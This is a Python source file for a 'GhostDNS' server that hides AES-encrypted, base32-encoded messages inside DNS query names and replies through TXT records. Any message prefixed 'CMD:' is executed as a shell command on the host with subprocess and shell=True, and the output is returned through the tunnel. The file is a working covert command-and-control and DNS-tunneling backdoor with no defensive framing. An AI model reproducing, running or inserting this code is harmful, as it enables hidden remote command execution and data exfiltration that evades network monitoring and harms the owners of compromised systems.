import socket
import struct
import threading
import base64
import logging
import os
import time
from typing import Tuple, Optional

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
except Exception as e:
    raise SystemExit("PyCryptodome is required: pip install pycryptodome")

# ------------------------------------------------------------
# Logging
# ------------------------------------------------------------

def ghost_logger(name: str = "GhostDNS_Server", level: int = logging.INFO) -> logging.Logger:
    logger = logging.getLogger(name)
    if not logger.handlers:
        handler = logging.StreamHandler()
        fmt = logging.Formatter('%(asctime)s [%(levelname)s] %(name)s: %(message)s')
        handler.setFormatter(fmt)
        logger.addHandler(handler)
        logger.setLevel(level)
    return logger

logger = ghost_logger()

# ------------------------------------------------------------
# Encoding / Crypto helpers
# ------------------------------------------------------------

DNS_MAX_LABEL = 63
DNS_MAX_NAME = 253
BASE_ALPHABET = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"  # base32 RFC 4648


def _b32_encode(data: bytes) -> str:
    return base64.b32encode(data).decode('ascii').strip('=')


def _b32_decode(text: str) -> bytes:
    # pad to length multiple of 8
    pad_len = (8 - (len(text) % 8)) % 8
    padded = text + ('=' * pad_len)
    return base64.b32decode(padded.encode('ascii'))


def _chunk_labels(enc: str) -> [str]:
    # labels <=63, keep alphabet limited; enc is base32 [A-Z2-7]
    chunks = []
    while enc:
        chunk = enc[:DNS_MAX_LABEL]
        chunks.append(chunk.lower())
        enc = enc[DNS_MAX_LABEL:]
    return chunks


def _unchunk_labels(labels: [str]) -> str:
    return ''.join(label.replace('-', '') for label in labels)


def _derive_key(secret: str, salt: bytes) -> bytes:
    return PBKDF2(secret, salt, dkLen=32, count=200_000)


def ghost_encode_payload(secret: str, plaintext: bytes) -> bytes:
    salt = get_random_bytes(16)
    key = _derive_key(secret, salt)
    nonce = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    # Simple inner header: ts(4) | rnd(2)
    inner = struct.pack('!IH', int(time.time()), int.from_bytes(get_random_bytes(2), 'big')) + plaintext
    ciphertext, tag = cipher.encrypt_and_digest(inner)
    blob = b'v1' + salt + nonce + tag + ciphertext
    return blob


def ghost_decode_payload(secret: str, blob: bytes) -> Optional[bytes]:
    try:
        if not blob.startswith(b'v1'):
            return None
        blob = blob[2:]
        salt = blob[:16]
        nonce = blob[16:28]
        tag = blob[28:44]
        ciphertext = blob[44:]
        key = _derive_key(secret, salt)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        inner = cipher.decrypt_and_verify(ciphertext, tag)
        # strip inner header
        if len(inner) < 6:
            return None
        return inner[6:]
    except Exception:
        return None

# ------------------------------------------------------------
# DNS helpers (minimal)
# ------------------------------------------------------------

def _build_dns_header(txid: int, flags: int, qdcount: int, ancount: int, nscount: int, arcount: int) -> bytes:
    return struct.pack('!HHHHHH', txid, flags, qdcount, ancount, nscount, arcount)


def _encode_qname(name: str) -> bytes:
    out = b''
    for label in name.strip('.').split('.'):
        out += struct.pack('B', len(label)) + label.encode('ascii')
    return out + b'\x00'


def _decode_qname(data: bytes, offset: int) -> Tuple[str, int]:
    labels = []
    orig = offset
    jumped = False
    while True:
        length = data[offset]
        if length & 0xC0 == 0xC0:
            # pointer
            if not jumped:
                orig = offset + 2
                jumped = True
            ptr = struct.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
            offset = ptr
            continue
        if length == 0:
            offset += 1
            break
        offset += 1
        labels.append(data[offset:offset+length].decode('ascii'))
        offset += length
    return '.'.join(labels), (orig if jumped else offset)

# Types
TYPE_A = 1
TYPE_TXT = 16
CLASS_IN = 1

# ------------------------------------------------------------
# GhostServer
# ------------------------------------------------------------

class GhostServer:
    def __init__(self, bind_ip: str = '0.0.0.0', port: int = 53, secret: str = 'change_me', domain: str = 'ghost.local'):
        self.bind_ip = bind_ip
        self.port = port
        self.secret = secret
        self.domain = domain.strip('.')
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((self.bind_ip, self.port))
        self.running = False
        logger.info(f"GhostServer listening on {self.bind_ip}:{self.port} for domain {self.domain}")

    def _parse_query(self, pkt: bytes) -> Tuple[int, str, int, int]:
        txid, flags, qd, an, ns, ar = struct.unpack('!HHHHHH', pkt[:12])
        offset = 12
        qname, offset = _decode_qname(pkt, offset)
        qtype, qclass = struct.unpack('!HH', pkt[offset:offset+4])
        return txid, qname, qtype, qclass

    def _build_response(self, txid: int, qname: str, rdata_chunks: [bytes], ttl: int = 5) -> bytes:
        # Flags: response, recursion not available
        flags = 0x8180  # std response, no error
        header = _build_dns_header(txid, flags, 1, len(rdata_chunks), 0, 0)
        question = _encode_qname(qname) + struct.pack('!HH', TYPE_TXT, CLASS_IN)
        answers = b''
        for chunk in rdata_chunks:
            # TXT: length octet then data
            txt = struct.pack('B', len(chunk)) + chunk
            rdata = struct.pack('!HHLH', TYPE_TXT, CLASS_IN, ttl, len(txt)) + txt
            answers += _encode_qname(qname) + rdata
        return header + question + answers

    def _extract_payload_from_qname(self, qname: str) -> Optional[bytes]:
        # Expect: <prefix>.<b32chunks>.<domain>
        parts = qname.strip('.').split('.')
        dom_parts = self.domain.split('.')
        if len(parts) <= len(dom_parts):
            return None
        if parts[-len(dom_parts):] != dom_parts:
            return None
        data_labels = parts[:-len(dom_parts)]
        if not data_labels or data_labels[0] != 'gh':
            return None
        enc = _unchunk_labels(data_labels[1:])
        try:
            blob = _b32_decode(enc.upper())
            return blob
        except Exception:
            return None

    def _make_txt_chunks(self, data: bytes) -> [bytes]:
        # Encode as base32, then into <=255 byte TXT chunks
        b32 = _b32_encode(data).encode('ascii')
        chunks = []
        i = 0
        while i < len(b32):
            chunk = b32[i:i+255]
            chunks.append(chunk)
            i += 255
        return chunks or [b'']

    def handle_packet(self, data: bytes, addr: Tuple[str, int]):
        try:
            txid, qname, qtype, qclass = self._parse_query(data)
            logger.debug(f"Query from {addr}: {qname} qtype={qtype}")
            blob = self._extract_payload_from_qname(qname)
            if blob is None:
                # Not our query; reply NXDOMAIN minimal
                flags = 0x8183  # NXDOMAIN
                resp = _build_dns_header(txid, flags, 1, 0, 0, 0) + _encode_qname(qname) + struct.pack('!HH', qtype, qclass)
                self.sock.sendto(resp, addr)
                return
            payload = ghost_decode_payload(self.secret, blob)
            if payload is None:
                logger.warning("Failed to decrypt payload")
                out = b"ERR:DECRYPT"
            else:
                logger.info(f"Received {len(payload)} bytes from {addr}")
                # Behavior:
                # - If payload starts with b'CMD:', execute the rest via shell and return stdout/stderr
                # - Else, echo with ACK prefix
                if payload.startswith(b'CMD:'):
                    cmd = payload[4:]
                    try:
                        import subprocess
                        completed = subprocess.run(cmd.decode('utf-8', 'ignore'), shell=True, capture_output=True, timeout=10)
                        out_bytes = completed.stdout + completed.stderr
                        # Cap response to avoid oversize DNS
                        if len(out_bytes) > 1200:
                            out_bytes = out_bytes[:1200] + b"\n...[truncated]"
                        out = b"RC=" + str(completed.returncode).encode() + b"\n" + out_bytes
                    except Exception as ce:
                        out = b"ERR:CMD:" + str(ce).encode('utf-8', 'ignore')
                else:
                    # Echo behavior: respond with ACK
                    out = b"ACK:" + payload
            enc_resp = ghost_encode_payload(self.secret, out)
            chunks = self._make_txt_chunks(enc_resp)
            resp = self._build_response(txid, qname, chunks)
            self.sock.sendto(resp, addr)
        except Exception as e:
            logger.exception(f"Error handling packet from {addr}: {e}")

    def serve_forever(self):
        self.running = True
        while self.running:
            try:
                data, addr = self.sock.recvfrom(4096)
                threading.Thread(target=self.handle_packet, args=(data, addr), daemon=True).start()
            except Exception as e:
                logger.error(f"Socket error: {e}")

    def stop(self):
        self.running = False
        try:
            self.sock.close()
        except Exception:
            pass


def main():
    import argparse
    parser = argparse.ArgumentParser(description='GhostDNS Server')
    parser.add_argument('--bind', default='0.0.0.0')
    parser.add_argument('--port', type=int, default=53)
    parser.add_argument('--secret', default='change_me')
    parser.add_argument('--domain', default='ghost.local')
    parser.add_argument('--debug', action='store_true')
    args = parser.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)

    srv = GhostServer(bind_ip=args.bind, port=args.port, secret=args.secret, domain=args.domain)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        logger.info('Stopping server...')
        srv.stop()


if __name__ == '__main__':
    main()
